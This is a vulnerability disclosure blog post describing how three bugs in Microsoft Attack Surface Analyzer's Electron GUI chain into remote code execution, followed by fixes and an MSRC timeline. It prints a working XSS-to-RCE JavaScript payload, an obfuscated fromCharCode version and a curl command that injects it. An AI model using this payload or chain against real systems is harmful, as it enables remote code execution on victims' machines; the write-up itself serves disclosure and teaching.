---
title: "Chaining Three Bugs to Get RCE in Microsoft AttackSurfaceAnalyzer"
date: 2019-06-18T13:03:53-07:00
draft: false
toc: true
comments: true
twitterImage: 08-calc-in-vm.png
categories:
- writeup
tags:
- rce
---

This is a blog post about how I found three vulns and chained them to get RCE in
the Microsoft 
[AttackSurfaceAnalyzer](https://github.com/microsoft/AttackSurfaceAnalyzer) (ASA
moving forward) GUI version.

1. ASA uses [Electron.NET](https://github.com/ElectronNET/Electron.NET) which
   binds the internal Kestrel web server to `0.0.0.0`. If permission is given to
   bypass the Windows OS firewall (or if used on an OS without one), a remote
   attacker can connect to it and access the application.
2. The web application is vulnerable to Cross-Site Scripting (XSS). A remote
   attacker can submit a runID with embedded JavaScript that is executed by
   the victim using the ASA Electron application.
3. Electron.NET does not have the `NodeIntegration` flag set to false. This
   allows the JavaScript payload to spawn up processes on the victim's machine.

<!--more-->

# Background
Around a month ago someone posted a link to the new version of the
 tool from Microsoft.

[Matt](https://twitter.com/mattt_cyber) who is my ultimate boss said:

> Wrote the first version of that with John Lambert over a holiday break...

I had never seen the tool before but I had used an internal tool which basically
did the same thing and more.

# What is AttackSurfaceAnalyzer (ASA)?
According to Microsoft

> Attack Surface Analyzer takes a snapshot of your system state before and after
> the installation of other software product(s) and displays changes to a number
> of key elements of the system attack surface.

You run it before you install an application/service and then after. Finally,
you can compare these two runs to see what the application has installed on the
machine.

ASA is typically run as root/admin. Because the application needs as much access
as possible to document and monitor changes to the machine.

# Electron, Electron EveryWhere!
The new version of the application is based on [Electron][electron-website].
Electron is a framework for packaging webapps as desktop applications. Think of
it as a Chromium instance opening your webapp running locally. To learn more
about Electron, please read any of the many tutorials.

Electron apps are very popular. I am writing this text in VS Code which is
another Electron app.

ASA uses [Electron.NET][electron.net-github] which "is a wrapper around a
"normal" Electron application with an embedded ASP.NET Core application." I am
not very familiar with the inner-workings of either framework but it looks like
it runs a local [Kestrel][kestrel-docs] web server and then opens an ASP.NET web
application via Electron.

# Running ASA
I downloaded [ASA v2.0.143][ASA-v2] and started it in a Windows VM from
[modern.ie][modern.ie]. ASA should be run as admin to get the most visibility
into the system/application.

After running ASA in an admin prompt. I saw the Windows Firewall alert.

{{< imgcap title="First Run" src="01-firewall-req.png" >}}

This was strange. Why would a local Electron app need to open Firewall ports?
Looking at the command prompt, I saw the culprit.

```
C:\Users\IEUser\Downloads\AsaGui-windows-2.0.141>
 Electron Socket IO Port: 8000
Electron Socket started on port 8000 at 127.0.0.1
ASP.NET Core Port: 8001
stdout: Use Electron Port: 8000

stdout: Hosting environment: Production
Content root path: C:\Users\IEUser\Downloads\AsaGui-windows-2.0.141\resources\app\bin\
Now listening on: http://0.0.0.0:8001
Application started. Press Ctrl+C to shut down.
```

The Kestrel web server is listening on all interfaces on port `8001`. The port
is not static, we can see in the application's source code that it starts from
port 8000 and uses the first two available ports. The first is used by Electron
and the second by the Kestrel web server. In a typical scenario, the ports will
be `8000` and `8001`.

* [Electron.NET/ElectronNET.Host/main.js#L141][main.js-startAspCoreBackend]

{{< codecaption title="title" lang="js" >}}
function startAspCoreBackend(electronPort) {

// hostname needs to be localhost, otherwise Windows Firewall will be triggered.
portscanner.findAPortNotInUse(8000, 65535, 'localhost', function (error, electronWebPort) {
    console.log('ASP.NET Core Port: ' + electronWebPort);
    loadURL = `http://localhost:${electronWebPort}`;
    const parameters = [`/electronPort=${electronPort}`, `/electronWebPort=${electronWebPort}`];
    let binaryFile = manifestJsonFile.executable;

    const os = require('os');
    if (os.platform() === 'win32') {
        binaryFile = binaryFile + '.exe';
    }

    let binFilePath = path.join(currentBinPath, binaryFile);
    var options = { cwd: currentBinPath };
    // Run the binary with params and options.
    apiProcess = process(binFilePath, parameters, options);

    apiProcess.stdout.on('data', (data) => {
        console.log(`stdout: ${data.toString()}`);
    });
});
}
{{< /codecaption >}}

These ports are passed to the binary as command line parameters. The binary file
is located at `AsaGui-windows-2.0.141/resources/app/bin/electron.manifest.json`
in a key named `executable`:

```json
{
  "executable": "AttackSurfaceAnalyzer-GUI"
}
```

Using procmon (use the filter `Process Name is AttackSurfaceAnalyzer-GUI` or use
`Tools > Process Tree`) we can see the parameters in action.

* `AttackSurfaceAnalyzer-GUI.exe /electronPort=8000 /electronWebPort=8001`

{{< imgcap title="Command line parameters" src="02-cmd-params.png" >}}

We can manually go to `localhost:8001` to see the application in the browser and
interact with it.

{{< imgcap title="ASA in browser" src="03-asa-in-browser.png" >}}

# Vuln 1: Listening on All Interfaces
The Kestrel web server listening on all interfaces. If it gets permission to
open ports or if you do not have a firewall (disable on Windows or
running on an OS without one), anyone can connect to it from outside.

I created a host-only network interface between the guest VM and the host. After
navigating to the guest IP in the host's browser at `192.168.56.101:8001`, I got
the following error:

* `HTTP Error 400. The request hostname is invalid.`

{{< imgcap title="Hostname is invalid" src="04-hostname-invalid.png" >}}

Or in Burp:

```html
HTTP/1.1 400 Bad Request
Connection: close
Date: Tue, 21 May 2019 20:14:36 GMT
Content-Type: text/html
Server: Kestrel
Content-Length: 334

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Bad Request</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></ HEAD >
<BODY><h2>Bad Request - Invalid Hostname</h2>
<hr><p>HTTP Error 400. The request hostname is invalid.</p>
</BODY></HTML>
```

Note the `Server: Kestrel` response header which is not really secret
information.

## Kestrel's Host Filtering
Kestrel has a host filtering middleware. Read more about it at:

* [Kestrel web server implementation in ASP.NET Core - Host Filtering][kestrel-filtering]

It filters incoming requests by the `Host` header. We can use a simple
`Proxy > Options > Match and Replace` rule in Burp to convert our requests'
`Host` header from `192.168.56.101:8001` to `localhost:8001` and access the web
application remotely.

{{< imgcap title="Bypass Host Filtering" src="05-bypass-host-filtering.png" >}}

This setting is enabled inside
`AsaGui-windows-2.0.141/resources/app/bin/appsettings.json` via `AllowedHosts`:

```json
{
  "Logging": {
    "LogLevel": {
      "Default": "Warning"
    }
  },
  "AllowedHosts": "localhost",
  "ApplicationInsights": {
    "InstrumentationKey": "79fc14e7-936c-4dcf-ba66-9a4da6e341ef"
  }
}
```

# Vuln2: Cross-Site Scripting
The application does not have a lot of injection points. User input is very
limited. We can submit scans and then analyze them. We can export the results in
specific paths and create reports.

The `Run Id` is pretty much the only place with user input. Let's try a basic
injection script and submit a run. When submitting a run, select something
simple like `Certificates` for quick runs.

Note: Run Ids are stored in a SQLite database and must be unique per app.

{{< imgcap title="XSS in Browser" src="06-xss-in-browser.png" >}}

Oops!

## XSS Root Cause Analysis
This is the request to submit our previous run.

```
http://192.168.56.101:8001/Home/StartCollection?Id=<script>alert(1)</script>&
File=false&Port=false&Service=false&User=false&Registry=false&Certificates=true
```

The application then calls `GetCollectors` to get information about the current
run and display progress.

* http://192.168.56.101:8001/Home/GetCollectors

The response to the app is a string containing a JSON object. The beautified
version of our test run is:

```json
{
    "RunId": "<script>alert(1)</script>",
    "Runs": {
        "CertificateCollector": 3
    }
}
```

The value of `RunId` is injected directly into the web page. The culprit is at
`js/Collect.js:174`:

{{< codecaption title="GetCollectors()" lang="js" >}}
function GetCollectors() {
    $.getJSON('GetCollectors', function (result) {
        var data = JSON.parse(result);
        var rundata = data.Runs;
        var keepChecking = false;
        var anyCollectors = false;
        var icon, midword;
        $('#ScanStatus').empty();

        if (Object.keys(rundata).length > 0) {
            // INJECTION
            $('#ScanStatus').append($('<div/>', { html: l("%StatusReportFor") + data.RunId + ".</i>" }));
        }

        // Removed
    });
}
{{< /codecaption >}}

There's no input validation or output encoding for `data.RunId`. Interestingly,
the IDs appear output encoded in the `Result` tab. Not being
[Lewis Ardern][lewis-twitter] (solid 5/7 JavaScript guy), I am glad this simple
payload worked.

## XSS in Guest from Remote Payloads
We have this reflected XSS which is pretty much worthless. Ok, not completely
worthless. If an attacker can make you click on a link to `localhost:8001` and
submit a payload, they can get XSS in your ASA/browser inside the VM. Not really
*that useful*.

But it gets better because the XSS persists in the guest VM running the ASA
Electron app. Without submitting a new run, navigate to the `Scan` tab (or click
on it again) in ASA's Electron app inside the guest VM and you should see the
alert.

![XSS in ASA in guest VM](07-xss-in-asa-guest.png)

When you navigate to the `Scan` tab, the application retrieves the information
for the latest submitted run (the one we submitted from host VM) and the
injected payload is executed. This means an attacker can connect to the app via
port `8001`, submit XSS and then it will pop in ASA when we use it locally.

# Vuln 3: XSS to RCE via NodeIntegration
Being Electron, I immediately thought of RCE. There are a lot of write-ups about
how you can convert an XSS to RCE in Electron. It's easy when `NodeIntegration`
is enabled which is the case for Electron.NET
([link to the current commit][electron.net-github-webpreferences]):

{{< codecaption title="WebPreferences.cs" lang="cs" >}}
/// <summary>
/// Whether node integration is enabled. Default is true.
/// </summary>
[DefaultValue(true)]
public bool NodeIntegration { get; set; } = true;
{{< /codecaption >}}

More info:

* [Electron Security - Do not enable Node.js Integration for Remote Content][electron-security-nodeintegration]

This means we can use the XSS to spawn processes in the guest VM running ASA.
Note that there are `NodeIntegration` bypasses so just disabling it might not be
enough.

### The RCE Payload
It's the typical `Electron XSS to RCE` payload. Google one and use it.

{{< codecaption title="XSS to RCE Payload" lang="js" >}}
var Process = process.binding('process_wrap').Process;
var proc = new Process();
proc.onexit = function(a,b) {};
var env = process.env;
var env_ = [];
for (var key in env) env_.push(key+'='+env[key]);
proc.spawn({file:'calc.exe',args:[],cwd:null,windowsVerbatimArguments:false,
    detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},
    {type:'ignore'}]});
{{< /codecaption >}}

Use the [JavaScript eval String.fromCharCode encoder][eval-encoder] to convert
it to the following. Then submit a new run with the payload as the `Run Id` from
the browser in the host machine (note that I have added a bogus `id` element to
make each payload unique):

```html
<img id="5" src=x onerror=eval(String.fromCharCode(118,97,114,32,80,114,111,99,
101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,
40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,
115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,
99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,
102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,
101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,
32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,
121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,
101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,
115,112,97,119,110,40,123,102,105,108,101,58,39,99,97,108,99,46,101,120,101,39,
44,97,114,103,115,58,91,93,44,99,119,100,58,110,117,108,108,44,119,105,110,100,
111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,
102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,
101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,
123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,
58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,
111,114,101,39,125,93,125,41,59))>
```

You can also submit the payload locally via this curl command:

```
curl -vvv -ik -H "Host:localhost:8001" "http://localhost:8001/Home/StartCollection?
Id=<img%20id=%225%22%20src=x%20onerror=eval(String.fromCharCode(118,97,114,32,80,
114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,
110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,
101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,
99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,
117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,
118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,
110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,
105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,
39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,
119,110,40,123,102,105,108,101,58,39,99,97,108,99,46,101,120,101,39,44,97,114,103,
115,58,91,93,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,
101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,
101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,
105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,
58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,
114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,
41,59))>&File=false&Port=false&Service=false&User=false&Registry=false&Certificates=true"
```

Switch back to the `Scan` tab (or click on it to reload it if it's already open)
in the guest VM and see `calc` pop up.

{{< imgcap title="Calc in guest VM" src="08-calc-in-vm.png" >}}

Incidentally, the command line value in procmon for running the calc looks like a kaomoji.

{{< imgcap title="Calc in procmon" src="09-calc-procmon.png" >}}

### Funky Gifs
Injecting the payload from VM host:

{{< imgcap title="Injecting from host into guest" src="10-test-run.gif" >}}

Injecting the payload locally:

{{< imgcap title="Localhost and curl" src="11-localhost.gif" >}}

# The Good and the Bad

**[+]** ASA is usually run as Admin. This allows ASA to have more visibility into the
OS and give us better results. This means our RCE is as admin.\
**[+]** The ports are usually `8000` and `8001`. Unless you are running
something else on those ports, it's easy to discover machines running a
vulnerable version of the ASA.\

**[-]** ASA is usually run in disposable VMs. You are not going to fingerprint
your applications on a prod VM. But these VMs are still connected to something.\

# How Can We Fix This?

1. Don't bind the web server to all interfaces.
2. Output encode `Run Id`s in the progress page.
3. Enable `NodeIntegration` and other Electron Defenses in Electron.NET.
    * See [Security, Native Capabilities, and Your Responsibility][electron-security]

The issue was reported to [Microsoft Security Response Center][msrc-link] on May
22nd 2019.

## Fixes

* `NodeIntegration` disabled and `ContextIsolation` enabled: [#218][218-commit]
* Not listening on all interfaces - in
  [Gui/Properties/launchSettings.json][launchSettings-link]: [#220][220-commit]
* `encodeURIComponent` the `runId` - in
  [Gui/wwwroot/js/Collect.js][collect-link]: [#220][220-commit]

# Timeline

| What Happened                  | When         |
|--------------------------------|--------------|
| Report                         | 22 May 2019  |
| Acknowledgement                | 22 May 2019  |
| MSRC asked for clarification   | 28 May 2019  |
| MSRC confirmed fix was applied | 06 June 2019 |
| Fix was confirmed              | 14 June 2019 |
| Disclosure                     | 18 June 2019 |

<!-- Links -->
[asa-github]: https://github.com/microsoft/AttackSurfaceAnalyzer
[electron.net-github]: https://github.com/ElectronNET/Electron.NET
[matt-twitter]: https://twitter.com/mattt_cyber
[electron-website]: https://electronjs.org/
[kestrel-docs]: https://docs.microsoft.com/en-us/aspnet/core/fundamentals/servers/kestrel
[ASA-v2]: https://github.com/microsoft/AttackSurfaceAnalyzer/releases/tag/v2.0.143%2Bfe41ced7df
[modern.ie]: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
[lewis-twitter]: https://twitter.com/lewisardern
[electron.net-github-webpreferences]: https://github.com/ElectronNET/Electron.NET/blob/3cb92169dd1fc4ca917e1a48551192038f68bbec/ElectronNET.API/Entities/WebPreferences.cs#L18
[electron-security-nodeintegration]: https://github.com/electron/electron/blob/master/docs/tutorial/security.md#2-do-not-enable-nodejs-integration-for-remote-content
[eval-encoder]: https://eve.gd/2007/05/15/javascript-eval-string-fromcharcode-encoder/
[main.js-startAspCoreBackend]: https://github.com/ElectronNET/Electron.NET/blob/131d1d9dd115d480b2c65353d44b9433b8b874f2/ElectronNET.Host/main.js#L141
[kestrel-filtering]: https://docs.microsoft.com/en-us/aspnet/core/fundamentals/servers/kestrel#host-filtering
[electron-security]: https://github.com/electron/electron/blob/master/docs/tutorial/security.md
[msrc-link]: https://msrc.microsoft.com/
[218-commit]: https://github.com/microsoft/AttackSurfaceAnalyzer/commit/0dffa1a04a4c047ddd7f682c0def740a8f17c810
[220-commit]: https://github.com/microsoft/AttackSurfaceAnalyzer/commit/37bce60e86e1d727970be6e5aa6ba1a1d8083b35
[launchSettings-link]: https://github.com/microsoft/AttackSurfaceAnalyzer/blob/37bce60e86e1d727970be6e5aa6ba1a1d8083b35/Gui/Properties/launchSettings.json#L30
[collect-link]: https://github.com/microsoft/AttackSurfaceAnalyzer/blob/3dec668982b513f92cb9bc8a00ff57fdaada14da/Gui/wwwroot/js/Collect.js#L59-L98
